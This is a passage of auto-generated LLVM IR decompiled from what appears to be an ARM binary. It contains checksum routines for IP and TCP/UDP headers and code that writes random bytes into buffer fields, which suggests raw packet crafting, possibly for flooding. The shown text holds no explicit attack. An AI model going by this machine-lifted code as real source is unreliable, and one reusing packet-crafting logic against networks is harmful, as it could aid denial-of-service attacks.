  %v1_e334 = load i32, i32* @r6, align 4
  %v9_e334 = icmp eq i32 %v3_df58, %v1_e334
  store i1 %v9_e334, i1* %cpsr_z.global-to-local, align 1
  %v1_e338 = trunc i32 %v4_e330 to i8
  %v2_e338 = load i32, i32* @r4, align 4
  %v3_e338 = add i32 %v2_e338, 5
  %v4_e338 = inttoptr i32 %v3_e338 to i8*
  store i8 %v1_e338, i8* %v4_e338, align 1
  %v3_e33c = load i32, i32* @r4, align 4
  %v4_e33c = add i32 %v3_e33c, 4
  %v5_e33c = inttoptr i32 %v4_e33c to i8*
  store i8 %v1_e328, i8* %v5_e33c, align 1
  %v0_e340 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e340, label %dec_label_pc_e344, label %dec_label_pc_e328.dec_label_pc_e23c_crit_edge

dec_label_pc_e328.dec_label_pc_e23c_crit_edge:    ; preds = %dec_label_pc_e328
  %v1_e240.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e23c

dec_label_pc_e344:                                ; preds = %dec_label_pc_e328, %dec_label_pc_e230
  %v0_e344 = call i32 @function_fe60()
  %v1_e344 = trunc i32 %v0_e344 to i8
  store i32 %v0_e344, i32* %r0.global-to-local, align 4
  store i32 %v3_df5c, i32* @lr, align 4
  %v4_e34c = sdiv i32 %v0_e344, 256
  store i32 %v4_e34c, i32* %r3.global-to-local, align 4
  %v1_e350 = load i32, i32* @r6, align 4
  %v9_e350 = icmp eq i32 %v3_df5c, %v1_e350
  store i1 %v9_e350, i1* %cpsr_z.global-to-local, align 1
  %v3_e354 = load i32, i32* @r4, align 4
  %v4_e354 = add i32 %v3_e354, 20
  %v5_e354 = inttoptr i32 %v4_e354 to i8*
  store i8 %v1_e344, i8* %v5_e354, align 1
  %v0_e358 = load i32, i32* %r3.global-to-local, align 4
  %v1_e358 = trunc i32 %v0_e358 to i8
  %v2_e358 = load i32, i32* @r5, align 4
  %v3_e358 = add i32 %v2_e358, 1
  %v4_e358 = inttoptr i32 %v3_e358 to i8*
  store i8 %v1_e358, i8* %v4_e358, align 1
  %v0_e35c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e35c, label %dec_label_pc_e360, label %dec_label_pc_e344.dec_label_pc_e248_crit_edge

dec_label_pc_e344.dec_label_pc_e248_crit_edge:    ; preds = %dec_label_pc_e344
  %v1_e24c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e248

dec_label_pc_e360:                                ; preds = %dec_label_pc_e344, %dec_label_pc_e23c
  %v0_e360 = call i32 @function_fe60()
  %v1_e360 = trunc i32 %v0_e360 to i8
  %v4_e364 = sdiv i32 %v0_e360, 256
  store i32 %v4_e364, i32* %r3.global-to-local, align 4
  %v3_e368 = load i32, i32* @r5, align 4
  %v4_e368 = add i32 %v3_e368, 2
  %v5_e368 = inttoptr i32 %v4_e368 to i8*
  store i8 %v1_e360, i8* %v5_e368, align 1
  store i32 %v3_df60, i32* %r0.global-to-local, align 4
  %v1_e370 = load i32, i32* @r6, align 4
  %v9_e370 = icmp eq i32 %v3_df60, %v1_e370
  store i1 %v9_e370, i1* %cpsr_z.global-to-local, align 1
  %v0_e374 = load i32, i32* %r3.global-to-local, align 4
  %v1_e374 = trunc i32 %v0_e374 to i8
  %v2_e374 = load i32, i32* @r5, align 4
  %v3_e374 = add i32 %v2_e374, 3
  %v4_e374 = inttoptr i32 %v3_e374 to i8*
  store i8 %v1_e374, i8* %v4_e374, align 1
  %v0_e378 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e378, label %dec_label_pc_e37c, label %dec_label_pc_e254

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e360, %dec_label_pc_e248
  %v0_e37c = call i32 @function_fe60()
  %v1_e37c = trunc i32 %v0_e37c to i8
  store i32 %v0_e37c, i32* %r0.global-to-local, align 4
  %v4_e380 = sdiv i32 %v0_e37c, 256
  store i32 %v4_e380, i32* %r3.global-to-local, align 4
  %v3_e384 = load i32, i32* @r4, align 4
  %v4_e384 = add i32 %v3_e384, 28
  %v5_e384 = inttoptr i32 %v4_e384 to i8*
  store i8 %v1_e37c, i8* %v5_e384, align 1
  %v0_e388 = load i32, i32* %r3.global-to-local, align 4
  %v1_e388 = trunc i32 %v0_e388 to i8
  %v2_e388 = load i32, i32* @r8, align 4
  %v3_e388 = add i32 %v2_e388, 1
  %v4_e388 = inttoptr i32 %v3_e388 to i8*
  store i8 %v1_e388, i8* %v4_e388, align 1
  br label %dec_label_pc_e254

dec_label_pc_e390:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_de28, %dec_label_pc_ddcc, %dec_label_pc_dc74
  %v0_e390 = call i32 @function_fe60()
  %v1_e394 = urem i32 %v0_e390, 4
  store i32 %v1_e394, i32* %r0.global-to-local, align 4
  %v2_e398 = icmp eq i32 %v1_e394, 3
  store i1 %v2_e398, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_e390 to i2
  switch i2 %trunc, label %dec_label_pc_ded020 [
    i2 0, label %dec_label_pc_e3d8
    i2 1, label %dec_label_pc_e3ec
    i2 -2, label %dec_label_pc_e3f8
    i2 -1, label %dec_label_pc_e408
  ]

dec_label_pc_e3b4:                                ; preds = %dec_label_pc_df30
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v4_e3b8 = sext i8 %v5_df4c to i32
  store i32 %v4_e3b8, i32* %r1.global-to-local, align 4
  %v2_e3bc = add i32 %v4_e3b8, %v2_dee0
  store i32 %v2_e3bc, i32* @fp, align 4
  br label %dec_label_pc_e1e8

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_df04
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = call i32 @function_13654(i32 %v3_def4)
  store i32 %v1_e3c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3cc

dec_label_pc_e3cc:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_ded0, %dec_label_pc_e3c4
  %v29_e3d4 = phi i32 [ %v3_def4, %dec_label_pc_dedc ], [ %v29_e3d474, %dec_label_pc_ded0 ], [ %v1_e3c8, %dec_label_pc_e3c4 ]
  store i32 %v3_dc74, i32* %r4.global-to-local, align 4
  store i32 %v15_dc74, i32* %r8.global-to-local, align 4
  store i32 %v18_dc74, i32* %sb.global-to-local, align 4
  store i32 %v21_dc74, i32* %sl.global-to-local, align 4
  store i32 %v24_dc74, i32* %fp.global-to-local, align 4
  ret i32 %v29_e3d4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e390
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e390
  store i32 707416650, i32* @r4, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e390
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e408:                                ; preds = %dec_label_pc_e390
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ded0

; uselistorder directives
  uselistorder i32 %v4_e3b8, { 0, 2, 1 }
  uselistorder i32 %v1_e394, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_e390, { 1, 0 }
  uselistorder i32 %v0_e37c, { 0, 2, 1 }
  uselistorder i32 %v0_e344, { 0, 2, 1 }
  uselistorder i32 %v4_e330, { 1, 0 }
  uselistorder i32 %v0_e328, { 0, 2, 1 }
  uselistorder i32 %v1_e304, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_e2a0, { 0, 2, 1 }
  uselistorder i32 %v0_e288, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e274, { 1, 0 }
  uselistorder i32 %v2_e270, { 0, 2, 1 }
  uselistorder i32 %v7_e21c, { 1, 0, 2 }
  uselistorder i32 %v4_e258.pre-phi, { 1, 0 }
  uselistorder i32 %v2_e19c, { 1, 0 }
  uselistorder i32 %v1_e19086, { 1, 0, 2 }
  uselistorder i32 %v1_e184, { 2, 1, 0 }
  uselistorder i32 %v0_e184, { 1, 2, 0 }
  uselistorder i32 %v0_e18432, { 1, 0 }
  uselistorder i32 %v1_e18433, { 2, 0, 1 }
  uselistorder i8 %extract.t78, { 1, 0 }
  uselistorder i32 %v1_e158, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_e0d4, { 1, 0 }
  uselistorder i32 %v3_e010, { 1, 0, 2 }
  uselistorder i32 %v1_dfd8, { 1, 0 }
  uselistorder i32 %v1_dfcc, { 1, 0 }
  uselistorder i32 %v1_dfb0, { 1, 0 }
  uselistorder i32 %v1_df9c, { 1, 0 }
  uselistorder i32 %v3_df94, { 1, 0 }
  uselistorder i32 %v4_df8c, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_df4c, { 1, 0 }
  uselistorder i32 %v0_df48, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_df3c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_df28, { 1, 0 }
  uselistorder i1 %v7_def8, { 1, 0 }
  uselistorder i32 %v3_def4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_dee0, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v1_dec8, { 1, 0, 2 }
  uselistorder i1 %v7_de98, { 1, 0 }
  uselistorder i32 %v1_de94, { 1, 0, 2 }
  uselistorder i1 %v8_de8c, { 1, 0 }
  uselistorder i1 %v7_de88, { 1, 0 }
  uselistorder i32 %v1_de7c, { 1, 0 }
  uselistorder i8 %v2_de70, { 2, 0, 1, 3 }
  uselistorder i32 %v0_de74, { 1, 0 }
  uselistorder i32 %v0_de94, { 3, 0, 2, 1 }
  uselistorder i32 %v0_de60, { 0, 2, 1 }
  uselistorder i32 %v1_de78, { 0, 2, 1 }
  uselistorder i32 %v2_de48, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_de40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_de28, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_de20, { 1, 0 }
  uselistorder i32 %v0_de20, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v0_ddc4, { 1, 0, 3, 2 }
  uselistorder i32 %v6_dd94, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_dd18, { 1, 0 }
  uselistorder i32 %v7_dcd4, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_dcd0, { 1, 0 }
  uselistorder i32 %v6_dcb0, { 1, 0 }
  uselistorder i32 %v2_dc98, { 0, 3, 1, 2 }
  uselistorder i32 %v1_dc80, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 51, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 46, 45, 47, 49, 48, 51, 50, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16, 17, 1, 18, 19, 67, 33, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 41, 68, 42, 44, 43, 46, 45, 47, 48, 50, 49, 51, 53, 52, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 21, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_a4e8, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 83, 84, 85, 86, 87, 88, 89, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 90, 91 }
  uselistorder label %dec_label_pc_e3cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e254, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e1f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e1e8, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %dec_label_pc_dea4, { 1, 0 }
  uselistorder label %dec_label_pc_de98, { 1, 0 }
  uselistorder label %dec_label_pc_de5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de54, { 1, 0 }
}

define i32 @function_e424(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e424:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_e454, label %dec_label_pc_e430

dec_label_pc_e430:                                ; preds = %dec_label_pc_e424
  %v0_e434.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e434

dec_label_pc_e434:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e430
  %v0_e448 = phi i32 [ %v2_e448, %dec_label_pc_e434 ], [ 0, %dec_label_pc_e430 ]
  %v0_e43c = phi i32 [ %v1_e43c, %dec_label_pc_e434 ], [ %arg1, %dec_label_pc_e430 ]
  %v0_e44c = phi i32 [ %v1_e44c, %dec_label_pc_e434 ], [ %v0_e434.pre, %dec_label_pc_e430 ]
  %v1_e434 = inttoptr i32 %v0_e44c to i8*
  %v2_e434 = load i8, i8* %v1_e434, align 1
  %v3_e434 = zext i8 %v2_e434 to i32
  %v1_e438 = add i32 %v0_e44c, 1
  %v2_e438 = inttoptr i32 %v1_e438 to i8*
  %v3_e438 = load i8, i8* %v2_e438, align 1
  %v4_e438 = zext i8 %v3_e438 to i32
  %v1_e43c = add i32 %v0_e43c, -2
  %v4_e440 = mul nuw nsw i32 %v4_e438, 256
  %v5_e440 = or i32 %v4_e440, %v3_e434
  %v2_e448 = add i32 %v5_e440, %v0_e448
  %v1_e44c = add i32 %v0_e44c, 2
  store i32 %v1_e44c, i32* @r0, align 4
  %v1_e43c.cmp = icmp ugt i32 %v1_e43c, 1
  br i1 %v1_e43c.cmp, label %dec_label_pc_e434, label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e424
  %v1_e45c = phi i32 [ 0, %dec_label_pc_e424 ], [ %v2_e448, %dec_label_pc_e434 ]
  %v0_e454 = phi i32 [ %arg1, %dec_label_pc_e424 ], [ %v1_e43c, %dec_label_pc_e434 ]
  %v7_e454 = icmp eq i32 %v0_e454, 1
  br i1 %v7_e454, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e454
  %v1_e458 = load i32, i32* @r0, align 4
  %v2_e458 = inttoptr i32 %v1_e458 to i8*
  %v3_e458 = load i8, i8* %v2_e458, align 1
  %v4_e458 = zext i8 %v3_e458 to i32
  %v3_e45c = add i32 %v1_e45c, %v4_e458
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e454, %bb
  %v0_e460 = phi i32 [ %v1_e45c, %dec_label_pc_e454 ], [ %v3_e45c, %bb ]
  %v3_e464 = urem i32 %v0_e460, 65536
  %v4_e468 = udiv i32 %v0_e460, 65536
  %v5_e468 = add nuw nsw i32 %v4_e468, %v3_e464
  %v4_e46c = udiv i32 %v5_e468, 65536
  %v5_e46c = add nuw nsw i32 %v4_e46c, %v5_e468
  %v1_e470 = urem i32 %v5_e46c, 65536
  %v3_e478 = xor i32 %v1_e470, 65535
  ret i32 %v3_e478

; uselistorder directives
  uselistorder i32 %v5_e468, { 1, 0 }
  uselistorder i32 %v1_e44c, { 1, 0 }
  uselistorder i32 %v1_e43c, { 1, 0, 2 }
  uselistorder i32 %v0_e44c, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e480:
  %v3_e490 = urem i32 %arg2, 65536
  %v1_e494 = add i32 %arg1, 12
  %v1_e498 = inttoptr i32 %v1_e494 to i32*
  %v2_e498 = load i32, i32* %v1_e498, align 4
  %v3_e498 = add i32 %arg1, 16
  %v4_e498 = inttoptr i32 %v3_e498 to i32*
  %v5_e498 = load i32, i32* %v4_e498, align 4
  %v7_e49c = icmp sgt i32 %arg3, 1
  br i1 %v7_e49c, label %dec_label_pc_e4a8.preheader, label %dec_label_pc_e4c8

dec_label_pc_e4a8.preheader:                      ; preds = %dec_label_pc_e480
  %v0_e4a8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e4a8.preheader, %dec_label_pc_e4a8
  %v0_e4bc = phi i32 [ 0, %dec_label_pc_e4a8.preheader ], [ %v2_e4bc, %dec_label_pc_e4a8 ]
  %v0_e4b0 = phi i32 [ %arg3, %dec_label_pc_e4a8.preheader ], [ %v1_e4b0, %dec_label_pc_e4a8 ]
  %v0_e4c0 = phi i32 [ %v0_e4a8.pre, %dec_label_pc_e4a8.preheader ], [ %v1_e4c0, %dec_label_pc_e4a8 ]
  %v1_e4a8 = inttoptr i32 %v0_e4c0 to i8*
  %v2_e4a8 = load i8, i8* %v1_e4a8, align 1
  %v3_e4a8 = zext i8 %v2_e4a8 to i32
  %v1_e4ac = add i32 %v0_e4c0, 1
  %v2_e4ac = inttoptr i32 %v1_e4ac to i8*
  %v3_e4ac = load i8, i8* %v2_e4ac, align 1
  %v4_e4ac = zext i8 %v3_e4ac to i32
  %v1_e4b0 = add nsw i32 %v0_e4b0, -2
  %v4_e4b4 = mul nuw nsw i32 %v4_e4ac, 256
  %v5_e4b4 = or i32 %v4_e4b4, %v3_e4a8
  %v2_e4bc = add i32 %v5_e4b4, %v0_e4bc
  %v1_e4c0 = add i32 %v0_e4c0, 2
  store i32 %v1_e4c0, i32* @r1, align 4
  %v8_e4c4 = icmp sgt i32 %v1_e4b0, 1
  br i1 %v8_e4c4, label %dec_label_pc_e4a8, label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e480
  %v1_e4d0 = phi i32 [ 0, %dec_label_pc_e480 ], [ %v2_e4bc, %dec_label_pc_e4a8 ]
  %v0_e4c8 = phi i32 [ %arg3, %dec_label_pc_e480 ], [ %v1_e4b0, %dec_label_pc_e4a8 ]
  %v7_e4c8 = icmp eq i32 %v0_e4c8, 1
  br i1 %v7_e4c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e4c8
  %v1_e4cc = load i32, i32* @r1, align 4
  %v2_e4cc = inttoptr i32 %v1_e4cc to i8*
  %v3_e4cc = load i8, i8* %v2_e4cc, align 1
  %v4_e4cc = zext i8 %v3_e4cc to i32
  %v3_e4d0 = add i32 %v4_e4cc, %v1_e4d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e4c8, %bb
  %v0_e4f4 = phi i32 [ %v1_e4d0, %dec_label_pc_e4c8 ], [ %v3_e4d0, %bb ]
  %v3_e4d8 = urem i32 %v2_e498, 65536
  %v1_e4e0 = add i32 %arg1, 9
  %v2_e4e0 = inttoptr i32 %v1_e4e0 to i8*
  %v3_e4e0 = load i8, i8* %v2_e4e0, align 1
  %v4_e4e0 = zext i8 %v3_e4e0 to i32
  %v3_e4e4 = urem i32 %v5_e498, 65536
  %v4_e4e8 = udiv i32 %v2_e498, 65536
  %v3_e4f0 = mul nuw nsw i32 %v4_e4e0, 256
  %v4_e4f4 = udiv i32 %v5_e498, 65536
  %v5_e4f4 = add i32 %v0_e4f4, %v4_e4f4
  %v2_e4f8 = add i32 %v5_e4f4, %v3_e4f0
  %v5_e4e8 = add nuw nsw i32 %v3_e4d8, %v3_e490
  %v2_e4ec = add nuw nsw i32 %v5_e4e8, %v4_e4e8
  %v2_e4fc = add nuw nsw i32 %v2_e4ec, %v3_e4e4
  %v2_e500 = add i32 %v2_e4f8, %v2_e4fc
  %tmp = icmp ult i32 %v2_e500, 65536
  br i1 %tmp, label %dec_label_pc_e520, label %dec_label_pc_e50c

dec_label_pc_e50c:                                ; preds = %.thread, %dec_label_pc_e50c
  %v2_e5141 = phi i32 [ %v2_e514, %dec_label_pc_e50c ], [ %v2_e500, %.thread ]
  %v3_e5182.in = phi i32 [ %v2_e514, %dec_label_pc_e50c ], [ %v2_e500, %.thread ]
  %v3_e5182 = udiv i32 %v3_e5182.in, 65536
  %v3_e510 = urem i32 %v2_e5141, 65536
  %v2_e514 = add nuw nsw i32 %v3_e510, %v3_e5182
  %tmp14 = icmp ult i32 %v2_e514, 65536
  br i1 %tmp14, label %dec_label_pc_e520.loopexit, label %dec_label_pc_e50c

dec_label_pc_e520.loopexit:                       ; preds = %dec_label_pc_e50c
  br label %dec_label_pc_e520

dec_label_pc_e520:                                ; preds = %dec_label_pc_e520.loopexit, %.thread
  %v0_e520 = phi i32 [ %v2_e514, %dec_label_pc_e520.loopexit ], [ %v2_e500, %.thread ]
  %v1_e520 = urem i32 %v0_e520, 65536
  %v3_e528 = xor i32 %v1_e520, 65535
  ret i32 %v3_e528

; uselistorder directives
  uselistorder i32 %v2_e514, { 2, 1, 3, 0 }
  uselistorder i32 %v2_e500, { 3, 0, 2, 1 }
  uselistorder i32 %v1_e4d0, { 1, 0 }
  uselistorder i32 %v1_e4c0, { 1, 0 }
  uselistorder i32 %v1_e4b0, { 0, 2, 1 }
  uselistorder i32 %v0_e4c0, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e50c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e4a8, { 1, 0 }
}

define i32 @function_e530(i32 %arg1) local_unnamed_addr {
dec_label_pc_e530:
  %v2_e534 = load i32, i32* @global_var_1ec84.97, align 4
  %v2_e53c = call i32 @function_13754(i32 %v2_e534, i32 9)
  %v0_e540 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e540, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_e530
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_e530, %bb
  ret i32 %v2_e53c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_e544(i32 %arg1) local_unnamed_addr {
dec_label_pc_e544:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e544 = load i32, i32* @r4, align 4
  store i32 %v3_e544, i32* %stack_var_-36, align 4
  %v6_e544 = load i32, i32* @r5, align 4
  %v9_e544 = load i32, i32* @r6, align 4
  %v12_e544 = load i32, i32* @r7, align 4
  %v15_e544 = load i32, i32* @r8, align 4
  %v18_e544 = load i32, i32* @sb, align 4
  %v21_e544 = load i32, i32* @sl, align 4
  %v24_e544 = load i32, i32* @fp, align 4
  %v2_e558 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_e558, i32* @sl, align 4
  %v3_e560 = mul i32 %arg1, 65536
  store i32 %v3_e560, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_e56c = ptrtoint i32* %stack_var_-8773 to i32
  %v2_e578 = bitcast i32* %stack_var_-4677 to i8*
  %v3_e578 = call i32 @function_13c90(i8* %v2_e578, i32 0)
  store i32 4096, i32* @r2, align 4
  %v2_e590 = bitcast i32* %stack_var_-8773 to i8*
  %v3_e590 = call i32 @function_13c90(i8* %v2_e590, i32 0)
  %v2_e594 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_e594, i32* @r6, align 4
  store i32 513, i32* @r2, align 4
  %v3_e5b4 = call i32 @function_13c90(i8* nonnull %stack_var_-581, i32 0)
  %v2_e5b8 = ptrtoint i8* %stack_var_-68 to i32
  %v1_e5c0 = load i32, i32* @r5, align 4
  %v4_e5c0 = udiv i32 %v1_e5c0, 16777216
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_e5e0 = trunc i32 %v4_e5c0 to i8
  %v4_e5e0 = call i32 @function_13188(i8 %v3_e5e0, i32 16, i32 %v2_e5b8)
  %v2_e5e8 = call i32 @function_12c94(i8* nonnull %stack_var_-68)
  %v7_e5ec = icmp eq i32 %v2_e5e8, 2
  br i1 %v7_e5ec, label %dec_label_pc_ea80, label %dec_label_pc_e5f4

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e544, %dec_label_pc_ea80
  %v1_e5f8 = call i32 @function_1236c(i32 6)
  %v1_e600 = call i32 @function_1236c(i32 7)
  %v1_e608 = call i32 @function_1236c(i32 9)
  %v0_e610 = load i32, i32* @r4, align 4
  %v4_e614 = call i32 @function_13780(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_15f60.99, i32 0, i32 0), i32 %v0_e610)
  %v7_e618 = icmp eq i32 %v4_e614, -1
  store i32 %v4_e614, i32* @r8, align 4
  br i1 %v7_e618, label %dec_label_pc_ea40, label %dec_label_pc_e624.preheader

dec_label_pc_e624.preheader:                      ; preds = %dec_label_pc_e5f4
  %v4_e63058 = call i32 @function_12eec(i8* nonnull %stack_var_-581, i32 512, i32 %v4_e614)
  %v2_e63460 = icmp eq i32 %v4_e63058, 0
  br i1 %v2_e63460, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e63c.lr.ph

dec_label_pc_e63c.lr.ph:                          ; preds = %dec_label_pc_e624.preheader
  %v2_e684 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_e63c

dec_label_pc_e63c:                                ; preds = %dec_label_pc_e63c.lr.ph, %dec_label_pc_e624.backedge
  %v3_e640 = load i8, i8* %stack_var_-581, align 1
  %v4_e640 = sext i8 %v3_e640 to i32
  %v2_e644 = icmp eq i8 %v3_e640, 0
  br i1 %v2_e644, label %bb130, label %bb

bb:                                               ; preds = %dec_label_pc_e63c
  %v8_e648 = icmp eq i8 %v3_e640, 58
  br i1 %v8_e648, label %.thread6, label %dec_label_pc_e65c

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_e674

bb130:                                            ; preds = %dec_label_pc_e63c
  br label %dec_label_pc_e674

dec_label_pc_e65c:                                ; preds = %bb
  %v1_e664.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %bb131, %dec_label_pc_e65c
  %v0_e660 = phi i32 [ %v1_e660, %bb131 ], [ 0, %dec_label_pc_e65c ]
  %v1_e660 = add i32 %v0_e660, 1
  %v2_e664 = add i32 %v1_e660, %v1_e664.pre
  %v3_e664 = inttoptr i32 %v2_e664 to i8*
  %v4_e664 = load i8, i8* %v3_e664, align 1
  %v6_e664 = zext i8 %v4_e664 to i32
  %v2_e668 = icmp eq i8 %v4_e664, 0
  br i1 %v2_e668, label %dec_label_pc_e674, label %bb131

bb131:                                            ; preds = %dec_label_pc_e660
  %v8_e66c = icmp eq i8 %v4_e664, 58
  br i1 %v8_e66c, label %dec_label_pc_e674, label %dec_label_pc_e660

dec_label_pc_e674:                                ; preds = %dec_label_pc_e660, %bb131, %bb130, %.thread6
  %v1_e6a0 = phi i32 [ 0, %.thread6 ], [ 0, %bb130 ], [ %v1_e660, %bb131 ], [ %v1_e660, %dec_label_pc_e660 ]
  %v0_e674 = phi i32 [ %v4_e640, %.thread6 ], [ %v4_e640, %bb130 ], [ %v6_e664, %bb131 ], [ %v6_e664, %dec_label_pc_e660 ]
  %v2_e674 = icmp eq i32 %v0_e674, 0
  br i1 %v2_e674, label %dec_label_pc_e624.backedge, label %dec_label_pc_e67c

